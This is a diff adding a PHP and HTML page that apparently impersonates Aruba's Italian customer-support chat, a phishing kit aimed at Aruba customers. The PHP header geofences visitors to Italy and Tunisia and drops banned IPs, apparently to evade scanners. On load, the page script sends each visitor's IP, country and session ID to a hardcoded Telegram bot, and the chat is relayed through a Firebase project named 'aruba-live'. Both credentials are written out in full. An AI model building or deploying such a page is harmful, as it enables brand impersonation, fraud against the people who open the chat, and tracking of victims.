@@ -1,0 +1,217 @@
+<?php
+// === ANTI-BOT FILTER ===
+$bannedFile = __DIR__ . '/banned_ips.txt';
+
+function getUserIP() {
+  if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
+  if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
+  return $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
+}
+
+$ip = getUserIP();
+$details = @json_decode(file_get_contents("http://ip-api.com/json/$ip?fields=status,country"));
+$country = ($details && $details->status === 'success') ? $details->country : 'Unknown';
+
+if (file_exists($bannedFile)) {
+  $banned = file($bannedFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+  if (in_array($ip, $banned)) {
+    header("HTTP/1.0 403 Forbidden");
+    exit;
+  }
+}
+
+$allowedCountries = ['Italy', 'Tunisia'];
+if (!in_array($country, $allowedCountries)) {
+  header("HTTP/1.0 403 Forbidden");
+  exit;
+}
+?>
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8" />
+  <title>Aruba - Assistenza Clienti</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f9f9f9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .chat-container {
+      background: #fff;
+      width: 100%;
+      max-width: 420px;
+      height: 90vh;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    .chat-header {
+      background: #f36f21;
+      color: white;
+      padding: 16px;
+      font-weight: bold;
+      text-align: center;
+    }
+
+    .chat-messages {
+      flex: 1;
+      padding: 16px;
+      overflow-y: auto;
+      background: #fff7f3;
+    }
+
+    .message {
+      margin: 10px 0;
+      padding: 10px 14px;
+      border-radius: 8px;
+      max-width: 80%;
+      font-size: 15px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+    }
+
+    .user {
+      align-self: flex-end;
+      background: #f36f21;
+      color: white;
+    }
+
+    .agent {
+      align-self: flex-start;
+      background: #e0e0e0;
+    }
+
+    .system {
+      background: #fff4e8;
+      color: #444;
+      text-align: center;
+      font-size: 14px;
+      padding: 10px;
+    }
+
+    .chat-input {
+      display: flex;
+      border-top: 1px solid #ddd;
+    }
+
+    .chat-input input {
+      flex: 1;
+      padding: 14px;
+      border: none;
+      font-size: 16px;
+    }
+
+    .chat-input button {
+      background: #e94e1b;
+      color: white;
+      border: none;
+      padding: 0 16px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="chat-container">
+    <div class="chat-header">Assistenza Clienti Aruba</div>
+    <div class="chat-messages" id="chatMessages">
+      <div class="message system">
+        👋 Benvenuto nel servizio clienti Aruba.<br>
+        💬 Un nostro operatore sarà disponibile tra pochi istanti per assisterti.
+      </div>
+    </div>
+    <div class="chat-input">
+      <input type="text" id="messageInput" placeholder="Scrivi il tuo messaggio..." />
+      <button onclick="sendMessage()">Invia</button>
+    </div>
+  </div>
+
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+
+  <script>
+    // === Firebase Config ===
+    const firebaseConfig = {
+      apiKey: "AIzaSyCkR1YE5NHChrEtP_5SPNjPEoh6qfMuXJQ",
+      authDomain: "aruba-live.firebaseapp.com",
+      projectId: "aruba-live",
+      storageBucket: "aruba-live.firebasestorage.app",
+      messagingSenderId: "780484186354",
+      appId: "1:780484186354:web:715d9afd3862d66e31806b"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    // === Session Setup ===
+    const sessionId = sessionStorage.getItem("sessionId") || crypto.randomUUID();
+    sessionStorage.setItem("sessionId", sessionId);
+
+    const sessionRef = db.collection("sessions").doc(sessionId);
+    const chatRef = sessionRef.collection("messages");
+    const chatMessages = document.getElementById("chatMessages");
+    const input = document.getElementById("messageInput");
+
+    // ✅ Ensure root document exists
+    sessionRef.set({ createdAt: firebase.firestore.FieldValue.serverTimestamp() }, { merge: true });
+
+    // === Listen to chat in real-time
+    chatRef.orderBy("timestamp").onSnapshot(snapshot => {
+      chatMessages.innerHTML = `
+        <div class="message system">
+          👋 Benvenuto nel servizio clienti Aruba.<br>
+          💬 Un nostro operatore sarà disponibile tra pochi istanti per assisterti.
+        </div>`;
+      snapshot.forEach(doc => {
+        const msg = doc.data();
+        const div = document.createElement("div");
+        div.className = "message " + (msg.sender || "agent");
+        div.textContent = msg.message;
+        chatMessages.appendChild(div);
+      });
+      chatMessages.scrollTop = chatMessages.scrollHeight;
+    });
+
+    // === Send message
+    function sendMessage() {
+      const text = input.value.trim();
+      if (!text) return;
+
+      chatRef.add({
+        sender: "user",
+        message: text,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      });
+
+      input.value = '';
+    }
+
+    // ✅ Send Telegram alert once
+    if (!sessionStorage.getItem("telegramSent")) {
+      fetch("https://ipapi.co/json")
+        .then(res => res.json())
+        .then(data => {
+          const message = `🌍 *New user started chat*\n\n🌐 IP: \`${data.ip}\`\n📍 Country: ${data.country_name}\n🆔 Session: \`${sessionId}\``;
+          fetch(`https://api.telegram.org/bot8134569625:AAG7bzuQM6wlzjzLfaFCVFPbuJ4qQQUTt6s/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: "-4932499123",
+              text: message,
+              parse_mode: "Markdown"
+            })
+          }).then(() => sessionStorage.setItem("telegramSent", "1"));
+        });
+    }
+  </script>
+</body>
+</html>
